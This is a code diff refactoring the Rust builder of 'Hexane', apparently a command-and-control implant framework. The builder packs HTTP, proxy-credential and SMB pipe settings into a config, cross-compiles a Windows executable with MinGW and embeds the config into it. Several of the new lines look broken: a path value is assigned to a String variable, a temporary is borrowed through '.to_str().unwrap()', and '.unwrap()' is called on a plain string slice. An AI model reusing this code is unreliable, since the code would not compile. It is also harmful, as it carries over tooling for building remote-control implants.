@@ -12,6 +12,11 @@ use crate::rstatic::{DEBUG_FLAGS, RELEASE_FLAGS, USERAGENT};
 use crate::types::{Builder, Compiler, Config, Loader, Network, UserSession};
 use crate::utils::{canonical_path_all, generate_hashes, generate_object_path, normalize_path, run_command};
 
+use crate::types::NetworkType::Http as HttpType;
+use crate::types::NetworkOptions::Http as HttpOpt;
+use crate::types::NetworkType::Smb as SmbType;
+use crate::types::NetworkOptions::Smb as SmbOpt;
+
 #[derive(Debug, Default)]
 pub struct Hexane {
     pub(crate) taskid:          u32,
@@ -106,7 +111,7 @@ impl Hexane {
             let opts = &network.options;
 
             match (rtype, &opts) {
-                (HttpType, crate::types::NetworkOptions::Http(ref http)) => {
+                (HttpType, HttpOpt(ref http)) => {
                     let useragent = http.useragent.as_ref().unwrap_or(&USERAGENT);
 
                     stream.pack_wstring(useragent);
@@ -120,8 +125,7 @@ impl Hexane {
 
                     if let Some(ref domain) = http.domain {
                         stream.pack_string(domain);
-                    }
-                    else {
+                    } else {
                         stream.pack_dword(0);
                     }
 
@@ -132,13 +136,12 @@ impl Hexane {
                         stream.pack_wstring(&proxy_url);
                         stream.pack_wstring(proxy.username.as_ref().unwrap());
                         stream.pack_wstring(proxy.password.as_ref().unwrap());
-                    }
-                    else {
+                    } else {
                         stream.pack_dword(0);
                     }
                 }
 
-                (SmbType, crate::types::NetworkOptions::Smb(ref smb) ) => {
+                (SmbType, SmbOpt(ref smb) ) => {
                     stream.pack_wstring(smb.egress_pipe
                         .as_ref()
                         .unwrap()
@@ -156,9 +159,6 @@ impl Hexane {
         let output      = &self.builder_cfg.output_name;
         let root_dir    = &self.builder_cfg.root_directory;
         let build_dir   = &self.compiler_cfg.build_directory;
-
-        let includes    = self.generate_includes();
-        let definitions = self.generate_definitions();
 
         let mut components  = Vec::new();
         let src_path        = Path::new(root_dir).join("src");
@@ -200,36 +200,29 @@ impl Hexane {
 
         log_info!(&"linking final objects".to_string());
 
-        let output  = Path::new(build_dir).join(output);
-        let targets = components.join(" ");
-        let flags   = &self.compiler_cfg.flags;
+        let mut linker  = String::new();
+        let includes    = self.generate_includes();
+        let definitions = self.generate_definitions();
 
-        let mut linker = None;
+        let output  = Path::new(build_dir).join(output).to_str().unwrap();
+        let flags   = &self.compiler_cfg.flags;
+        let targets = components.join(" ");
+
         if let Some(script) = &self.builder_cfg.linker_script {
             linker = Path::new(root_dir).join(script);
-
             linker = normalize_path(linker.into());
             linker = format!(" -T {} ", linker.as_str());
         }
 
-        let command = format!(
-            "{} {} {} {} {} {} -o {}.exe",
-            "x86_64-w64-mingw32-g++".to_string(),
-            includes,
-            definitions,
-            targets,
-            linker,
-            flags,
-            output.to_str().unwrap()
-        );
+        let command = format!("{} {} {} {} {} {} -o {}.exe", "x86_64-w64-mingw32-g++".to_string(), includes, definitions, targets, linker, flags, output);
 
-        if let Err(e) = run_command(command, "linker_error") {
+        if let Err(e) = run_command(command.as_str(), "linker_error") {
             return Err(Custom(format!("compile_sources:: {e}")));
         }
 
         let config          = self.config.clone();
         let config_size     = self.main_cfg.config_size as usize;
-        let embed_target    = output.to_str().unwrap();
+        let embed_target    = output.unwrap();
 
         if let Err(e) = embed_section_data(&format!("{}.exe", embed_target), &config, config_size) {
             return Err(Custom(format!("compile_sources:: {e}")));
